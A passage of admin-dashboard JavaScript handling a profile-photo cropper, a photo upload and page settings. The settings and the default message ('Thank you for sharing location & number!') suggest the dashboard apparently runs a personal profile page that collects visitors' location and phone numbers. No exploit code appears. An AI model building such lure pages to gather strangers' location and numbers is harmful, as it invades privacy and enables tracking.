  cropCtx.lineTo(CROP_CENTER + CROP_CIRCLE_RADIUS - 25, CROP_CENTER);
  cropCtx.stroke();
  cropCtx.setLineDash([]);

  // Inner oval hint for face positioning
  cropCtx.beginPath();
  cropCtx.ellipse(CROP_CENTER, CROP_CENTER, 48, 62, 0, 0, Math.PI * 2);
  cropCtx.strokeStyle = 'rgba(56, 189, 248, 0.25)';
  cropCtx.lineWidth = 1;
  cropCtx.setLineDash([3, 5]);
  cropCtx.stroke();
  cropCtx.setLineDash([]);

  cropCtx.restore();
}

function openImageCropper(imageSource) {
  if (!cropModal) return;

  cropImageObj = new Image();
  cropImageObj.crossOrigin = 'anonymous';

  cropImageObj.onload = () => {
    // Calculate scale so image covers the circle
    const minDim = Math.min(cropImageObj.naturalWidth, cropImageObj.naturalHeight);
    const neededDiameter = CROP_CIRCLE_RADIUS * 2;
    const baseScale = neededDiameter / minDim;

    cropState.baseScale = baseScale;
    cropState.scale = baseScale;
    cropState.posX = CROP_CENTER;
    cropState.posY = CROP_CENTER;
    cropState.rotation = 0;
    cropState.isDragging = false;

    if (cropZoomSlider) {
      cropZoomSlider.value = 1.0;
    }
    if (cropZoomValue) {
      cropZoomValue.textContent = '1.0x';
    }

    cropModal.style.display = 'flex';
    drawCropView();
  };

  cropImageObj.onerror = () => {
    alert('Photo ko load karne me samasya aayi. Kripya dubara photo select karein.');
  };

  cropImageObj.src = imageSource;
}

function closeImageCropper() {
  if (cropModal) {
    cropModal.style.display = 'none';
  }
  cropState.isDragging = false;
}

// Mouse & Touch Interaction for Cropper
if (cropCanvas) {
  // Mouse Dragging
  cropCanvas.addEventListener('mousedown', (e) => {
    cropState.isDragging = true;
    cropState.dragStartX = e.clientX;
    cropState.dragStartY = e.clientY;
    cropState.initialPosX = cropState.posX;
    cropState.initialPosY = cropState.posY;
  });

  window.addEventListener('mousemove', (e) => {
    if (!cropState.isDragging) return;
    const dx = e.clientX - cropState.dragStartX;
    const dy = e.clientY - cropState.dragStartY;
    cropState.posX = cropState.initialPosX + dx;
    cropState.posY = cropState.initialPosY + dy;
    drawCropView();
  });

  window.addEventListener('mouseup', () => {
    cropState.isDragging = false;
  });

  // Mouse Wheel Zoom
  cropCanvas.addEventListener('wheel', (e) => {
    e.preventDefault();
    const zoomDelta = e.deltaY < 0 ? 0.08 : -0.08;
    const currentVal = parseFloat(cropZoomSlider.value);
    const nextVal = Math.min(3.5, Math.max(0.5, currentVal + zoomDelta));
    cropZoomSlider.value = nextVal.toFixed(2);
    cropZoomValue.textContent = nextVal.toFixed(2) + 'x';
    cropState.scale = cropState.baseScale * nextVal;
    drawCropView();
  }, { passive: false });

  // Touch Dragging & Pinch to Zoom on Mobile
  cropCanvas.addEventListener('touchstart', (e) => {
    if (e.touches.length === 1) {
      cropState.isDragging = true;
      cropState.dragStartX = e.touches[0].clientX;
      cropState.dragStartY = e.touches[0].clientY;
      cropState.initialPosX = cropState.posX;
      cropState.initialPosY = cropState.posY;
    } else if (e.touches.length === 2) {
      cropState.isDragging = false;
      cropState.touchDist = Math.hypot(
        e.touches[0].clientX - e.touches[1].clientX,
        e.touches[0].clientY - e.touches[1].clientY
      );
    }
  }, { passive: false });

  cropCanvas.addEventListener('touchmove', (e) => {
    e.preventDefault();
    if (e.touches.length === 1 && cropState.isDragging) {
      const dx = e.touches[0].clientX - cropState.dragStartX;
      const dy = e.touches[0].clientY - cropState.dragStartY;
      cropState.posX = cropState.initialPosX + dx;
      cropState.posY = cropState.initialPosY + dy;
      drawCropView();
    } else if (e.touches.length === 2) {
      const dist = Math.hypot(
        e.touches[0].clientX - e.touches[1].clientX,
        e.touches[0].clientY - e.touches[1].clientY
      );
      if (cropState.touchDist > 0) {
        const diff = dist - cropState.touchDist;
        const currentVal = parseFloat(cropZoomSlider.value);
        const nextVal = Math.min(3.5, Math.max(0.5, currentVal + diff * 0.008));
        cropZoomSlider.value = nextVal.toFixed(2);
        cropZoomValue.textContent = nextVal.toFixed(2) + 'x';
        cropState.scale = cropState.baseScale * nextVal;
        drawCropView();
      }
      cropState.touchDist = dist;
    }
  }, { passive: false });

  cropCanvas.addEventListener('touchend', (e) => {
    if (e.touches.length === 0) {
      cropState.isDragging = false;
      cropState.touchDist = 0;
    }
  });
}

// Zoom Slider
if (cropZoomSlider) {
  cropZoomSlider.addEventListener('input', () => {
    const val = parseFloat(cropZoomSlider.value);
    cropZoomValue.textContent = val.toFixed(2) + 'x';
    cropState.scale = cropState.baseScale * val;
    drawCropView();
  });
}

// Zoom In/Out Buttons
if (cropZoomInBtn && cropZoomSlider) {
  cropZoomInBtn.addEventListener('click', () => {
    const val = Math.min(3.5, parseFloat(cropZoomSlider.value) + 0.15);
    cropZoomSlider.value = val.toFixed(2);
    cropZoomValue.textContent = val.toFixed(2) + 'x';
    cropState.scale = cropState.baseScale * val;
    drawCropView();
  });
}

if (cropZoomOutBtn && cropZoomSlider) {
  cropZoomOutBtn.addEventListener('click', () => {
    const val = Math.max(0.5, parseFloat(cropZoomSlider.value) - 0.15);
    cropZoomSlider.value = val.toFixed(2);
    cropZoomValue.textContent = val.toFixed(2) + 'x';
    cropState.scale = cropState.baseScale * val;
    drawCropView();
  });
}

// Rotate Button
if (cropRotateBtn) {
  cropRotateBtn.addEventListener('click', () => {
    cropState.rotation = (cropState.rotation + 90) % 360;
    drawCropView();
  });
}

// Center Face Button
if (cropCenterBtn) {
  cropCenterBtn.addEventListener('click', () => {
    cropState.posX = CROP_CENTER;
    cropState.posY = CROP_CENTER;
    cropState.rotation = 0;
    cropState.scale = cropState.baseScale;
    if (cropZoomSlider) cropZoomSlider.value = 1.0;
    if (cropZoomValue) cropZoomValue.textContent = '1.0x';
    drawCropView();
  });
}

// Close and Cancel Buttons
if (closeCropModalBtn) closeCropModalBtn.addEventListener('click', closeImageCropper);
if (cancelCropBtn) cancelCropBtn.addEventListener('click', closeImageCropper);

// Save & Crop Button: Render 512x512 High-Res Image & Upload
if (saveCropBtn) {
  saveCropBtn.addEventListener('click', async () => {
    if (!cropImageObj.complete || !cropImageObj.naturalWidth) return;

    saveCropBtn.disabled = true;
    saveCropBtnText.textContent = 'Crop ho raha hai...';

    try {
      const OUTPUT_SIZE = 512;
      const factor = OUTPUT_SIZE / (CROP_CIRCLE_RADIUS * 2);

      const outCanvas = document.createElement('canvas');
      outCanvas.width = OUTPUT_SIZE;
      outCanvas.height = OUTPUT_SIZE;
      const outCtx = outCanvas.getContext('2d');

      outCtx.imageSmoothingEnabled = true;
      outCtx.imageSmoothingQuality = 'high';

      outCtx.save();
      outCtx.translate(
        OUTPUT_SIZE / 2 + (cropState.posX - CROP_CENTER) * factor,
        OUTPUT_SIZE / 2 + (cropState.posY - CROP_CENTER) * factor
      );
      outCtx.rotate((cropState.rotation * Math.PI) / 180);
      outCtx.scale(cropState.scale * factor, cropState.scale * factor);
      outCtx.drawImage(
        cropImageObj,
        -cropImageObj.naturalWidth / 2,
        -cropImageObj.naturalHeight / 2
      );
      outCtx.restore();

      const croppedBase64 = outCanvas.toDataURL('image/jpeg', 0.92);

      dpUploadStatus.textContent = '⏳ Saving cropped photo to server...';
      dpUploadStatus.style.color = 'var(--accent-cyan)';

      const data = await safeFetchJson('/api/admin/upload-dp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify({
          imageData: croppedBase64
        })
      });

      // Update previews
      if (adminDpPreview) adminDpPreview.src = data.imageUrl;
      if (cfgImgUrl) cfgImgUrl.value = data.imageUrl;

      dpUploadStatus.textContent = '✅ Face centered & profile picture updated!';
      dpUploadStatus.style.color = 'var(--accent-emerald)';

      alertBannerText.textContent = '📸 Profile photo face centered & updated successfully!';
      alertBanner.style.display = 'flex';
      setTimeout(() => { alertBanner.style.display = 'none'; }, 6000);

      closeImageCropper();

    } catch (err) {
      console.error('Crop save error:', err);
      alert('Failed to save cropped photo: ' + err.message);
    } finally {
      saveCropBtn.disabled = false;
      saveCropBtnText.textContent = '✓ Crop & Save Face DP';
    }
  });
}

// Open Cropper on current image
if (openCropperBtn) {
  openCropperBtn.addEventListener('click', () => {
    const currentSrc = (adminDpPreview && adminDpPreview.src) || (cfgImgUrl && cfgImgUrl.value) || 'profile.jpg';
    openImageCropper(currentSrc);
  });
}

// Wire DP File Upload button and file input
if (triggerUploadBtn && dpFileInput) {
  triggerUploadBtn.addEventListener('click', () => {
    dpFileInput.click();
  });

  dpFileInput.addEventListener('change', (e) => {
    const file = e.target.files && e.target.files[0];
    if (!file) return;

    if (!file.type.startsWith('image/')) {
      alert('Please select a valid image file (JPG, PNG, WEBP, GIF).');
      return;
    }

    if (file.size > 20 * 1024 * 1024) {
      alert('Image file is too large! Please choose an image under 20MB.');
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      openImageCropper(reader.result);
    };
    reader.readAsDataURL(file);
    dpFileInput.value = '';
  });
}

async function loadAdminConfig() {
  try {
    const data = await safeFetchJson('/api/config');
    if (data.success && data.config) {
      const c = data.config;
      if (cfgName) cfgName.value = c.profileName || '';
      if (cfgTitle) cfgTitle.value = c.profileTitle || '';
      if (cfgBio) cfgBio.value = c.profileBio || '';
      if (cfgPageTitle) cfgPageTitle.value = c.pageTitle || '';
      if (cfgButtonText) cfgButtonText.value = c.buttonText || '';
      if (cfgImgUrl) cfgImgUrl.value = c.profileImgUrl || '';
      if (adminDpPreview && c.profileImgUrl) adminDpPreview.src = c.profileImgUrl;
      if (cfgDefaultCountry && c.defaultCountry) cfgDefaultCountry.value = c.defaultCountry;
      if (cfgRequirePhone) cfgRequirePhone.checked = c.requirePhone !== false;
      if (cfgRequireOtp) cfgRequireOtp.checked = c.requireOtp !== false;
      if (cfgThemeColor) cfgThemeColor.value = c.themeColor || '#06b6d4';
      if (cfgSuccessTitle) cfgSuccessTitle.value = c.successTitle || '✨ Thank You For Sharing!';
      if (cfgSuccessMessage) cfgSuccessMessage.value = c.successMessage || 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝';
    }
  } catch (e) {
    console.error('Failed to load config:', e.message);
  }
}

if (configForm) {
  configForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const payload = {
      profileName: cfgName.value.trim(),
      profileTitle: cfgTitle.value.trim(),
      profileBio: cfgBio.value.trim(),
      pageTitle: cfgPageTitle.value.trim(),
      buttonText: cfgButtonText.value.trim(),
      profileImgUrl: cfgImgUrl.value.trim() || 'profile.jpg',
      defaultCountry: cfgDefaultCountry.value,
      requirePhone: cfgRequirePhone.checked,
      requireOtp: cfgRequireOtp.checked,
      themeColor: cfgThemeColor.value,
      successTitle: cfgSuccessTitle ? cfgSuccessTitle.value.trim() : '✨ Thank You For Sharing!',
      successMessage: cfgSuccessMessage ? cfgSuccessMessage.value.trim() : 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝'
    };

    const saveBtn = document.getElementById('saveConfigBtn');
    saveBtn.disabled = true;
    saveBtn.innerHTML = `<span>Saving...</span>`;

    try {
      const data = await safeFetchJson('/api/admin/config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify(payload)
      });

      if (adminDpPreview && payload.profileImgUrl) {
        adminDpPreview.src = payload.profileImgUrl;
      }

      configSaveStatus.style.display = 'inline-block';
      configSaveStatus.textContent = '✓ Saved & Applied to Frontend!';
      setTimeout(() => {
        configSaveStatus.style.display = 'none';
      }, 4000);

    } catch (err) {
      alert('Error saving settings: ' + err.message);
    } finally {
      saveBtn.disabled = false;
      saveBtn.innerHTML = `💾 Save &amp; Apply Changes Live`;
    }
  });
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// --------------------------------------------------------------------------
// Auto-login if session exists
// --------------------------------------------------------------------------
document.addEventListener('DOMContentLoaded', async () => {
  if (adminKey) {
    const valid = await verifyAuth(adminKey);
    if (valid) {
      authOverlay.style.display = 'none';
      initializeDashboard();
      return;
    }
  }
  authOverlay.style.display = 'flex';
});
